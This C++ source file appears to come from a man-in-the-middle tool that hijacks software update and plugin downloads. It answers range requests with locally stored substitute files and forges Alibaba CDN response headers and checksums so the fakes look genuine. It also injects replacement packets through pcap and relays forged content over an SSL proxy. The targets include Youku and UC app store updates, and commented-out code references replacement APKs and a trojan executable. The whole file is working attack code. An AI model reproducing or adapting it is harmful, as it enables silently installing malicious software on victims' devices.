
#include "HttpPartial.h"
#include "ReplacePacket.h"
#include "Public.h"
#include "attack.h"
#include "attacker.h"
#include "Packet.h"
#include "FileOper.h"
#include "ssl/sslPublic.h"
#include "cipher/CryptoUtils.h"
#include "cipher/Base64.h"



char * lpYoukuData = 0;
int iYoukudateSize = 0;



//download.alicdn.com/freedom/58245/compress/6fb1a836586fd637faf9d1b3de7bf8d1.zip
//download.alicdn.com/freedom/58245/compress/74f38295f5991115867896bc6ee7864b.zip
//com.pp.plugin.appstore.worker.PPAlarmIntentService.ucPpappstoreEntry
int HttpPartial::sendPartFileWithoutHdr(string fn, SOCKET s, int begin, int end) {

	string filename = "";
	if (fn.c_str()[0] == '/')
	{
		filename = Public::getPluginPathWithoutSlash() + fn;
	}
	else {
		filename = Public::getPluginPath() + fn;
	}

	char szout[2048];
	//string filename = Public::getPluginPathWithoutSlash() + string(fn);

	int ret = 0;
	int filesize = 0;
	char *lpdata = 0;
	ret = FileOper::fileDecryptReader(filename, &lpdata, &filesize);
	if (ret <= 0)
	{
		int outlen = wsprintfA(szout, "file:%s open error\r\n", filename.c_str());
		Public::WriteLogFile(szout);
		return FALSE;
	}

	if (end == -1)
	{
		end = filesize - 1;
	}
	if (end >= filesize)
	{
		end = filesize - 1;
	}

	if (filesize <= 0 || begin >= filesize || begin < 0)
	{
		delete[]lpdata;
		int outlen = wsprintfA(szout, "file:%s Partial start:%u,end:%u error\r\n", filename.c_str(), begin, end);
		Public::WriteLogFile(szout);
		printf("sendPartFileWithoutHdr:%s filesize or begin or end error\r\n",fn.c_str());
		return FALSE;
	}

	int sendsize = end - begin + 1;
	ret = send(s, lpdata + begin, sendsize, 0);
	delete[]lpdata;
	if (ret != sendsize)
	{
		printf("sendPartFileWithoutHdr:%s send data packet error\r\n",fn.c_str());
		return FALSE;
	}
	else {
		printf("sendPartFileWithoutHdr:%s send data packet ok\r\n",fn.c_str());
		return TRUE;
	}
}



int HttpPartial::sendPartFileWithoutHdr(string fn, LPSSLPROXYPARAM ssl, int begin, int end) {

	char szout[2048];
	string filename = "";
	if (fn.c_str()[0] == '/')
	{
		filename = Public::getPluginPathWithoutSlash() + fn;
	}
	else {
		filename = Public::getPluginPath() + fn;
	}
	//string filename = Public::getPluginPathWithoutSlash() + string(fn);

	int ret = 0;
	int filesize = 0;
	char *lpdata = 0;
	ret = FileOper::fileDecryptReader(filename, &lpdata, &filesize);
	if (ret <= 0)
	{
		int outlen = wsprintfA(szout, "file:%s open error\r\n", filename.c_str());
		Public::WriteLogFile(szout);
		return FALSE;
	}

	if (end == -1)
	{
		end = filesize - 1;
	}
	if (end >= filesize)
	{
		end = filesize - 1;
	}

	if (filesize <= 0 || begin >= filesize || begin < 0)
	{
		delete[]lpdata;
		int outlen = wsprintfA(szout, "file:%s Partial start:%u,end:%u error\r\n", filename.c_str(), begin, end);
		Public::WriteLogFile(szout);
		printf("sendPartFileWithouHdr:%s filesize or begin or end error\r\n", fn.c_str());
		return FALSE;
	}

	int sendsize = end - begin + 1;

	int sslblocksize = SSL_MAX_BLOCK_SIZE;
	int sendtimes = sendsize / sslblocksize;
	int sendmod = sendsize % sslblocksize;
	int offset = 0;
	for (int i = 0;i < sendtimes;i ++)
	{
		ret = SSL_write(ssl->SSLToClient, lpdata + begin + offset, sslblocksize);
		offset += sslblocksize;
	}
	
	if (sendmod)
	{
		ret = SSL_write(ssl->SSLToClient, lpdata + begin + offset, sendmod);
	}

	//ret = send(s, lpdata + begin, sendsize, 0);
	delete[]lpdata;
	if (ret != sendsize)
	{
		printf("sendPartFileWithoutHdr:%s send data packet error\r\n", fn.c_str());
		return FALSE;
	}
	else {
		printf("sendPartFileWithoutHdr:%s send data packet ok\r\n", fn.c_str());
		return TRUE;
	}
}



/*
HTTP/1.1 206 Partial Content
Server: Tengine
Content-Type: application/vnd.android.package-archive
Content-Length: 727936
Connection: keep-alive
Date: Wed, 22 Aug 2018 12:03:13 GMT
x-oss-request-id: 5B7D5101E94046642BECA8F3
Accept-Ranges: bytes
ETag: "B1CE63CCEC53D33AB995D8E7FC143BFD"
Last-Modified: Wed, 22 Aug 2018 11:56:49 GMT
x-oss-object-type: Normal
x-oss-hash-crc64ecma: 16297477636409932447
x-oss-storage-class: Standard
Content-MD5: sc5jzOxT0zq5ldjn/BQ7/Q==
x-oss-server-time: 27
Via: cache26.l2eu6-1[0,206-0,H], cache19.l2eu6-1[2,0], cache11.cn1412[0,206-0,H], cache7.cn1412[0,0]
Age: 5576278
Ali-Swift-Global-Savetime: 1536283886
X-Cache: HIT TCP_MEM_HIT dirn:12:427765394
X-Swift-SaveTime: Fri, 07 Sep 2018 01:31:26 GMT
X-Swift-CacheTime: 7776000
Content-Range: bytes 0-727935/727936
Timing-Allow-Origin: *
EagleId: 7ce89e9b15405156713025566e
*/
int HttpPartial::AliCdnPartialFile(string fn,SOCKET s, int begin, int end) {

	char szout[2048];
	string filename = "";
	if (fn.c_str()[0] == '/')
	{
		filename = Public::getPluginPathWithoutSlash() + fn;
	}
	else {
		filename = Public::getPluginPath() + fn;
	}
	//string filename = Public::getPluginPathWithoutSlash() + string(fn);

	int ret = 0;
	int filesize = 0;
	char *lpdata = 0;
	ret = FileOper::fileDecryptReader(filename, &lpdata, &filesize);
	if (ret <= 0)
	{
		int outlen = wsprintfA(szout, "file:%s open error\r\n", filename.c_str());
		Public::WriteLogFile(szout);
		return FALSE;
	}

	if (end == -1)
	{
		end = filesize - 1;
	}
	if (end >= filesize)
	{
		end = filesize - 1;
	}

	if (filesize <= 0 || begin >= filesize || begin < 0 )
	{
		delete[]lpdata;
		int outlen = wsprintfA(szout, "file:%s Partial start:%u,end:%u error\r\n", filename.c_str(), begin, end);
		Public::WriteLogFile(szout);
		printf("sendPartFileWithouHdr:%s filesize or begin or end error\r\n", fn.c_str());
		return FALSE;
	}

	int sendsize = end - begin + 1;

	char * szHttpPartialZipFormat = "HTTP/1.1 206 Partial Content\r\n"
		"Content-Type: application/vnd.android.package-archive\r\n"
		"Connection: keep-alive\r\n"
		"Accept-Ranges: bytes\r\n"
		"Content-Range: bytes %u-%u/%u\r\n"
		"x-oss-request-id: 5C6C595E10C40E751406673E\r\n"
		"x-oss-object-type: Normal\r\n"
		"x-oss-storage-class: Standard\r\n"
		"Cache-Control: max-age=86400\r\n"
		"Age: 86400\r\n"
		"ETag: \"%s\"\r\n"
		"x-oss-hash-crc64ecma: %s\r\n"
		"x-oss-meta-md5: %s\r\n"
		"X-Swift-CacheTime: 86400\r\n"
		"Timing-Allow-Origin: *\r\n"
		"EagleId: 7515e1a115506618762527848e\r\n"
		"Content-MD5: %s\r\n"
		"Content-Length: %u\r\n\r\n";

	string crc64 = CryptoUtils::FileCrc64(filename, -1, 0);
	if (crc64 == "")
	{
		return FALSE;
	}

	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);

	char szmd5Lowercase[64] = { 0 };
	filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5Lowercase, hexmd5, TRUE);

	char szbase64md5[64] = { 0 };
	ret = Base64::Base64Encode(szbase64md5, (const unsigned char*)hexmd5, 16);

	char hdrformat[4096];
	int httphdrlen = sprintf_s(hdrformat, 4096, szHttpPartialZipFormat,
		begin,end,sendsize,szmd5, crc64.c_str(), szmd5Lowercase, szbase64md5,filesize);


	ret = send(s, hdrformat, httphdrlen, 0);
	ret = send(s, lpdata + begin, sendsize, 0);
	delete[]lpdata;
	if (ret != sendsize)
	{
		printf("AliCdnPartialFile:%s send data packet error\r\n", fn.c_str());
		return FALSE;
	}
	else {
		printf("AliCdnPartialFile:%s send data packet ok\r\n", fn.c_str());
		return TRUE;
	}

	return httphdrlen;
}


int HttpPartial::AliCdnPartialFile(string fn, LPSSLPROXYPARAM ssl, int begin, int end) {

	char szout[2048];
	//string filename = Public::getPluginPathWithoutSlash() + string(fn);
	string filename = "";
	if (fn.c_str()[0] == '/')
	{
		filename = Public::getPluginPathWithoutSlash() + fn;
	}
	else {
		filename = Public::getPluginPath() + fn;
	}

	int ret = 0;
	int filesize = 0;
	char *lpdata = 0;
	ret = FileOper::fileDecryptReader(filename, &lpdata, &filesize);
	if (ret <= 0)
	{
		int outlen = wsprintfA(szout, "file:%s open error\r\n", filename.c_str());
		Public::WriteLogFile(szout);
		return FALSE;
	}

	if (end == -1)
	{
		end = filesize - 1;
	}
	if (end >= filesize)
	{
		end = filesize - 1;
	}

	if (filesize <= 0 || begin >= filesize || begin < 0)
	{
		delete[]lpdata;
		int outlen = wsprintfA(szout, "file:%s Partial start:%u,end:%u error\r\n", filename.c_str(), begin, end);
		Public::WriteLogFile(szout);
		printf("sendPartFileWithouHdr:%s filesize or begin or end error\r\n", fn.c_str());
		return FALSE;
	}

	int sendsize = end - begin + 1;

	char * szHttpPartialZipFormat = "HTTP/1.1 206 Partial Content\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Connection: keep-alive\r\n"
		"Accept-Ranges: bytes\r\n"
		"Content-Range: bytes %u-%u/%u\r\n"
		"x-oss-request-id: 5C6C595E10C40E751406673E\r\n"
		"x-oss-object-type: Normal\r\n"
		"x-oss-storage-class: Standard\r\n"
		"Cache-Control: max-age=86400\r\n"
		"Age: 86400\r\n"
		"ETag: \"%s\"\r\n"
		"x-oss-hash-crc64ecma: %s\r\n"
		"x-oss-meta-md5: %s\r\n"
		"X-Swift-CacheTime: 86400\r\n"
		"Timing-Allow-Origin: *\r\n"
		"EagleId: 7515e1a115506618762527848e\r\n"
		"Content-MD5: %s\r\n"
		"Content-Length: %u\r\n\r\n";

	string crc64 = CryptoUtils::FileCrc64(filename, -1, 0);
	if (crc64 == "")
	{
		return FALSE;
	}

	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);

	char szmd5Lowercase[64] = { 0 };
	filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5Lowercase, hexmd5, TRUE);

	char szbase64md5[64] = { 0 };
	ret = Base64::Base64Encode(szbase64md5, (const unsigned char*)hexmd5, 16);

	char hdrformat[4096];
	int httphdrlen = sprintf_s(hdrformat, 4096, szHttpPartialZipFormat,
		begin, end, sendsize, szmd5, crc64.c_str(), szmd5Lowercase, szbase64md5, filesize);


	ret = SSL_write(ssl->SSLToClient, hdrformat, httphdrlen);

	int sslblocksize = SSL_MAX_BLOCK_SIZE;
	int sendtimes = sendsize / sslblocksize;
	int sendmod = sendsize % sslblocksize;
	for (int i = 0;i < sendtimes; i++)
	{
		ret = SSL_write(ssl->SSLToClient, lpdata + begin + i *sslblocksize, sslblocksize);
		if (ret <= 0)
		{
			break;
		}
	}
	if (sendmod)
	{
		ret = SSL_write(ssl->SSLToClient, lpdata + begin + sendtimes * sslblocksize, sendmod);
	}

	//ret = send(s, lpdata + begin, sendsize, 0);
	delete[]lpdata;
	if (ret <= 0)
	{
		printf("AliCdnPartialFile:%s send data packet error\r\n", fn.c_str());
		return FALSE;
	}
	else {
		printf("AliCdnPartialFile:%s send data packet ok\r\n", fn.c_str());
		return TRUE;
	}

	return httphdrlen;
}



int HttpPartial::sendPartialFile(string fn,SOCKET s, int begin, int end,string formatstr) {

	int ret = 0;
	char szout[2048];
	int filesize = 0;
	char *lpdata = 0;

// 	if (fn.find(QQMINIBROWSER_FILE_NAME) != -1)
// 	{
// 		//filesize = qqbrowser->m_filesize;
// 		//lpdata = qqbrowser->m_lpdata;
// 		filesize = iQQMiniBrowserDataSize;
// 		lpdata = lpQQMiniBrowserData;
// 	}
// 	else if (fn.find(QQNEWS_VIDEO_SO_PACKAGENAME) != -1)
// 	{
// 		filesize = iQQnewsDataSize;
// 		lpdata = lpQQnewsData;
// 	}
// 	else if (fn.find(IQIYI_PLUGIN_FILENAME) != -1)
// 	{
// 		filesize = iIqiyiDataSize;
// 		lpdata = lpIqiyiVideoData;
// 	}
// 	else if (fn.find(IQIYI_PC_UPDATE_FILENAME) != -1)
// 	{
// 		filesize = iIqiyiPcUpdateSize;
// 		lpdata = lpIqiyiPcUpdateData;
// 	}
	if (fn.find(YOUKUPLUGIN_FILE_NAME) != -1)
	{
		filesize = iYoukudateSize;
		lpdata = lpYoukuData;
	}
// 	else if (fn.find(ANDROID_REPLACE_FILENAME) != -1)
// 	{
// 		char * tmp = strstr(replaceApk->m_lpdata, "\r\n\r\n");
// 		if (tmp)
// 		{
// 			tmp += 4;
// 			int tmplen = tmp - replaceApk->m_lpdata;
// 			filesize = replaceApk->m_filesize;
// 			lpdata = replaceApk->m_lpdata + tmplen;
// 		}
// 	}
// 	else if (fn.find(EXETROJAN_FILE_NAME) != -1)
// 	{
// 		char * tmp = strstr(replaceExe->m_lpdata, "\r\n\r\n");
// 		if (tmp)
// 		{
// 			tmp += 4;
// 			filesize = replaceExe->m_filesize;
// 			lpdata = tmp;
// 		}
// 	}
// 	else if (fn.find(STORMPLAYER_VOICE1_FILENAME) != -1)
// 	{
// 		char * tmp = strstr(gStormPlayerVoice1->m_lpdata, "\r\n\r\n");
// 		if (tmp)
// 		{
// 			tmp += 4;
// 			filesize = gStormPlayerVoice1->m_filesize;
// 			lpdata = tmp;
// 		}
// 	}
// 	else if (fn.find(OPPOBROWSER_FILE_NAME) != -1)
// 	{
// 		filesize = iOppoBrowserDataSize;
// 		lpdata = lpOppoBrowserData;
// 	}
	else if (fn.find(UCPPAPPSTORE_UPDATE_FILENAME) != -1)
	{
		
		sendPartFileWithoutHdr(fn, s, begin, end);
		return 0;
	}
	else{
		wsprintfA(szout, "file name:%s not recognized\r\n", fn.c_str());
		printf(szout);
		
		return FALSE;
	}

	if (filesize <= 0 || begin >= filesize || end >= filesize || begin < 0)
	{
		printf("sendPartialFile filesize or begin or end error\r\n");
		return FALSE;
	}

	int sendlast = end;
	if (sendlast == -1)
	{
		sendlast = filesize - 1;
	}

	int sendoffset = begin;
	int sendsize = sendlast - sendoffset + 1;

	char szDataRespHdr[MAX_RESPONSE_HEADER_SIZE];
	int iDataRespHdrLen = sprintf_s(szDataRespHdr, MAX_RESPONSE_HEADER_SIZE, formatstr.c_str(),sendoffset,sendlast, filesize, sendsize);
	ret = send(s, szDataRespHdr, iDataRespHdrLen, 0);
	ret = send(s, lpdata + sendoffset, sendsize, 0);

	printf("range offset:%d,length:%d,http reply header:%s\r\n", sendoffset, sendsize, szDataRespHdr);
	if (ret != sendsize)
	{
		printf("sendPartialFile send data packet error\r\n");
		return FALSE;
	}
	else {
		printf("sendPartialFile send data packet ok\r\n");
		return TRUE;
	}
}


int HttpPartial::sendReplacePartial(pcap_t * pcapT,  char * lppacket, int packetsize, int start,int end,char * ip,int type,LPPPPOEHEADER pppoe) {
	int ret = 0;
	if (m_lpfiledata && m_filesize)
	{
		int partialsize = end - start + 1;
		char * lpsendbuf = new char[partialsize + MAX_RESPONSE_HEADER_SIZE];
		char * httphdrformat =
			"HTTP/1.1 206 Partial Content\r\n"
			"Content-Type: application/zip\r\n"
			"Content-Range: bytes %u-%u/%u\r\n"
			"Connection: keep-alive\r\n"
			"Content-Length: %u\r\n\r\n";
		char httphdr[MAX_RESPONSE_HEADER_SIZE];
		int httphdrlen = sprintf_s(httphdr, MAX_RESPONSE_HEADER_SIZE, httphdrformat, start,end, m_filesize, partialsize);
		memmove(lpsendbuf, httphdr, httphdrlen);
		memmove(lpsendbuf + httphdrlen, m_lpfiledata + start, partialsize);
		ret = AttackPacket::ReplacePacket(pcapT, lppacket, packetsize, lpsendbuf, httphdrlen + partialsize,ip,type,pppoe);
		delete[] lpsendbuf;

		//ret = ReplacePacket(pcapT, lppacket, packetsize, httphdr, httphdrlen, "weixin xwebruntime header" );
		//ret = ReplacePacket(pcapT, lppacket, packetsize, lpfiledata + start, partialsize, "weixin xwebruntime data");
		//printf("find weixin xwebruntime packet pos:%u-%u,size:%u\r\n", start, end, partialsize);
	}
	return ret;
}




int HttpPartial::PrepareReplacePartial(string filename) {

	int ret = FileOper::fileDecryptReader(filename, &m_lpfiledata, &m_filesize);
	if (ret <= 0)
	{
		return FALSE;
	}

	return m_filesize;
}
